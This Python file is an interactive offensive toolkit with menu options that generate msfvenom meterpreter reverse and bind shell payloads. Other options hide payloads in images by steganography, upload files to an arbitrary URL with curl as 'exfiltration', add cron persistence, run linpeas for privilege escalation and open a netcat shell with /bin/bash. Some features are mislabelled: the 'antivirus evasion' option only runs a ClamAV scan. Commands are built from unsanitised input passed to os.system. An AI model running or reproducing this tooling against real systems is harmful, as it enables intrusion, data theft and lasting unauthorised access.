import subprocess
import sys
import os
import re
import base64

def execute_command(command, success_message):
    try:
        subprocess.run(command, shell=True, check=True)
        print(success_message)
    except subprocess.CalledProcessError as e:
        print(f"\033[91mError: {e}\033[0m")
    except Exception as e:
        print(f"\033[91mAn unexpected error occurred: {e}\033[0m")

def generate_reverse_shell_payload(payload_ip, payload_port, payload_type, payload_name, encoder=None):
    if payload_type == 'linux':
        if encoder:
            command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f elf -e {encoder} -o {payload_name}.elf"
        else:
            command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
    elif payload_type == 'windows':
        if encoder:
            command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f exe -e {encoder} -o {payload_name}.exe"
        else:
            command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f exe -o {payload_name}.exe"
    elif payload_type == 'macos':
        if encoder:
            command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f macho -e {encoder} -o {payload_name}.macho"
        else:
            command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f macho -o {payload_name}.macho"
    else:
        print("\033[91mInvalid payload type.\033[0m")
        return
    
    execute_command(command, "\033[92mPayload generated successfully.\033[0m")

def generate_bind_shell_payload(payload_ip, payload_port, payload_name, encoder=None):
    if encoder:
        command = f"msfvenom -p linux/x64/meterpreter/bind_tcp RHOST={payload_ip} LPORT={payload_port} -f elf -e {encoder} -o {payload_name}.elf"
    else:
        command = f"msfvenom -p linux/x64/meterpreter/bind_tcp RHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
    execute_command(command, "\033[92mPayload generated successfully.\033[0m")


def generate_payload():
    print("\033[94m.--------------------- Payload Generation Menu ---------------------.")
    print("| \033[94m 1. Generate reverse shell payload                                    \033[94m |")
    print("| \033[94m 2. Generate bind shell payload                                       \033[94m |")
    print("| \033[94m 0. Back to main menu                                                 \033[94m |")
    print("`----------------------------------------------------------------------´")
    choice = input("\033[92mEnter your choice: \033[0m")

    if choice == '1':
        payload_type = input("\033[92mEnter the type of payload (linux/windows/macos): \033[0m")
        payload_ip = input("\033[92mEnter the IP address for reverse shell: \033[0m")
        payload_port = input("\033[92mEnter the port for reverse shell: \033[0m")
        payload_name = input("\033[92mEnter the name for the payload file: \033[0m")
        encoder = input("\033[92mEnter the encoder (optional): \033[0m")
        generate_reverse_shell_payload(payload_ip, payload_port, payload_type, payload_name, encoder)
    elif choice == '2':
        payload_ip = input("\033[92mEnter the IP address for bind shell: \033[0m")
        payload_port = input("\033[92mEnter the port for bind shell: \033[0m")
        payload_name = input("\033[92mEnter the name for the payload file: \033[0m")
        encoder = input("\033[92mEnter the encoder (optional): \033[0m")
        generate_bind_shell_payload(payload_ip, payload_port, payload_name, encoder)
    elif choice == '0':
        return
    else:
        print("\033[91mInvalid choice. Please try again.\033[0m")
        generate_payload()

def backdoor_file(payload_ip, payload_port, payload_name):
    command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
    execute_command(command, "\033[92mPayload generated successfully.\033[0m")

def encrypt_file():
    print("\033[94m.---------------------- Encrypt File ------------------------.")
    print("| \033[94mEncrypting File...                                                  \033[94m |")
    print("`----------------------------------------------------------------´")

    password = input("\033[92mEnter the password for encryption: \033[0m")

    input_file = "file.txt"
    output_archive = "filename.zip"
    
    if not os.path.exists(input_file):
        print("\033[91mError: The specified input file does not exist.\033[0m")
        return
    
    command = f"7z a -t7z -p{password} -mx9 -mhe=on {output_archive} {input_file}"
    os.system(command)

def hide_payload():
    print("\033[94m.--------------------- Hide Payload ------------------------.")
    print("| \033[94mPerforming File Steganography...                                      \033[94m |")
    print("`----------------------------------------------------------------´")
    payload_name = input("\033[92mEnter the name for the payload file: \033[0m")
    image_name = input("\033[92mEnter the name of the image file (with extension): \033[0m")
    
    # Check if the payload file and image file exist
    if not os.path.isfile(payload_name):
        print("\033[91mError: The specified payload file does not exist.\033[0m")
        return
    if not os.path.isfile(image_name):
        print("\033[91mError: The specified image file does not exist.\033[0m")
        return
    
    # Perform steganography to embed the payload into the image
    os.system(f"steghide embed -cf {image_name} -ef {payload_name} -sf stego_{image_name}")
    print("\033[92mPayload hidden successfully using steganography.\033[0m")

def exfiltrate_data():
    print("\033[94m.------------------- Exfiltrate Data ----------------------.")
    print("| \033[94mExfiltrating Data...                                                  \033[94m |")
    print("`----------------------------------------------------------------´")
    file_name = input("\033[92mEnter the name of the file to exfiltrate: \033[0m")
    upload_url = input("\033[92mEnter the URL to upload thefile to: \033[0m")
    
    # Check if the specified file exists
    if not os.path.isfile(file_name):
        print("\033[91mError: The specified file does not exist.\033[0m")
        return
    
    # Perform data exfiltration using curl
    os.system(f"curl -T {file_name} {upload_url}")
    print("\033[92mData exfiltrated successfully.\033[0m")

def escalate_privileges():
    print("\033[94m.----------------- Escalate Privileges --------------------.")
    print("| \033[94mEscalating Privileges...                                               \033[94m |")
    print("`----------------------------------------------------------------´")
    os.system("cd && cd /usr/share/peass/linpeas/ && ./linpeas.sh")

def establish_persistence():
    print("\033[94m.--------------- Establish Persistence -------------------.")
    print("| \033[94mEstablishing Persistence...                                             \033[94m |")
    print("`----------------------------------------------------------------´")
    script_path = input("\033[92mEnter the path to the script for persistence: \033[0m")
    
    # Check if the specified script exists
    if not os.path.isfile(script_path):
        print("\033[91mError: The specified script does not exist.\033[0m")
        return
    
    # Append cron job to the current user's crontab
    os.system(f"(crontab -l 2>/dev/null; echo '0 0 * * * {script_path}') | crontab -")
    print("\033[92mPersistence established successfully.\033[0m")

def evade_antivirus(payload_name):
    print("\033[94m.--------------- Evade Antivirus Detection ---------------.")
    print("| \033[94mEvading Antivirus Detection...                                           \033[94m |")
    print("`----------------------------------------------------------------´")
    os.system(f"clamscan -r -i {payload_name}")

def connect_reverse_shell():
    print("\033[94m.----------------- Connect Reverse Shell -----------------.")
    print("| \033[94mConnecting Reverse Shell...                                             \033[94m |")
    print("`----------------------------------------------------------------´")
    try:
        subprocess.run(["nc", "-lvnp", "4444", "-e", "/bin/bash"], check=True)
    except subprocess.CalledProcessError as e:
        print("\033[91mError: Failed to connect reverse shell. Make sure netcat (nc) is installed and the port is available.\033[0m")

def analyze_traffic(interface="wlan0", output_file="capture.pcap"):
    print("\033[94m.------------------- Analyze Traffic ---------------------.")
    print("| \033[94mAnalyzing Network Traffic...                                            \033[94m |")
    print("`----------------------------------------------------------------´")
    try:
        # Run tcpdump command with subprocess
        subprocess.run(["sudo", "tcpdump", "-i", interface, "-w", output_file], check=True)
        print("\033[92mNetwork traffic captured successfully.\033[0m")
    except subprocess.CalledProcessError as e:
        print("\033[91mError: Failed to capture network traffic.\033[0m")
        print(f"\033[91m{e}\033[0m")

def automate_post_exploitation():
    print("\033[94m.---------------- Automate Post-Exploitation ----------------.")
    print("| \033[94mAutomating Post-Exploitation...                                        \033[94m |")
    print("`----------------------------------------------------------------´")
    try:
        # Launch Metasploit Framework console
        subprocess.run(["msfconsole"], check=True)
    except subprocess.CalledProcessError as e:
        print("\033[91mError: Failed to automate post-exploitation.\033[0m")
        print(f"\033[91m{e}\033[0m")

def manipulate_data():
    print("\033[94m.----------------- Manipulate Data ----------------------.")
    print("| \033[94mManipulating Data...                                                    \033[94m |")
    print("`----------------------------------------------------------------´")
    
    # Prompt user for file path and replacement text
    file_path = input("\033[92mEnter the file path: \033[0m")
    old_text = input("\033[92mEnter the text to be replaced: \033[0m")
    new_text = input("\033[92mEnter the new text: \033[0m")
    
    try:
        # Execute sed command to replace text in the file
        subprocess.run(["sed", "-i", f"s/{old_text}/{new_text}/g", file_path], check=True)
        print("\033[92mData manipulation successful.\033[0m")
    except subprocess.CalledProcessError as e:
        print("\033[91mError: Failed to manipulate data.\033[0m")
        print(f"\033[91m{e}\033[0m")

def list_files():
    print("\033[94m.------------------- Listing Files ----------------------.")
    print("| \033[94mListing Files...                                                         \033[94m |")
    print("`----------------------------------------------------------------´")
    try:
        # Execute ls command to list files in the current directory
        subprocess.run(["ls", "-l"], check=True)
    except subprocess.CalledProcessError as e:
        print("\033[91mError: Failed to list files.\033[0m")
        print(f"\033[91m{e}\033[0m")

def exit_program():
    print("\033[94m.------------------- Exiting Program ---------------------.")
    print("| \033[94mExiting...                                                                     \033[94m |")
    print("`----------------------------------------------------------------´")
    sys.exit(0)

def main_menu():
    while True:
        print("\033[94m.------------------- Main Menu ----------------------.")
        print("| \033[94m1. Generate Payload                                     \033[94m |")
        print("| \033[94m2. Encrypt File                                          \033[94m |")
        print("| \033[94m3. Hide Payload                                             \033[94m |")
        print("| \033[94m4. Exfiltrate Data                                          \033[94m |")
        print("| \033[94m5. Escalate Privileges                                    \033[94m |")
        print("| \033[94m6. Establish Persistence                               \033[94m |")
        print("| \033[94m7. Evade Antivirus Detection                       \033[94m |")
        print("| \033[94m8. Connect Reverse Shell                              \033[94m |")
        print("| \033[94m9. Analyze Traffic                                       \033[94m |")
        print("| \033[94m10. Automate Post-Exploitation                            \033[94m |")
        print("| \033[94m11. Manipulate Data                                       \033[94m |")
        print("| \033[94m12. List Files                                             \033[94m |")
        print("| \033[94m0. Exit                                                    \033[94m |")
        print("`----------------------------------------------------------------´")
        choice = input("\033[92mEnter your choice: \033[0m")

        if choice == '1':
            generate_payload()
        elif choice == '2':
            encrypt_file()
        elif choice == '3':
            hide_payload()
        elif choice == '4':
            exfiltrate_data()
        elif choice == '5':
            escalate_privileges()
        elif choice == '6':
            establish_persistence()
        elif choice == '7':
            payload_name = input("\033[92mEnter the name of the payload file: \033[0m")
            evade_antivirus(payload_name)
        elif choice == '8':
            connect_reverse_shell()
        elif choice == '9':
            analyze_traffic()
        elif choice == '10':
            automate_post_exploitation()
        elif choice == '11':
            manipulate_data()
        elif choice == '12':
            list_files()
        elif choice == '0':
            exit_program()
        else:
            print("\033[91mInvalid choice. Please try again.\033[0m")

if __name__ == "__main__":
    main_menu()
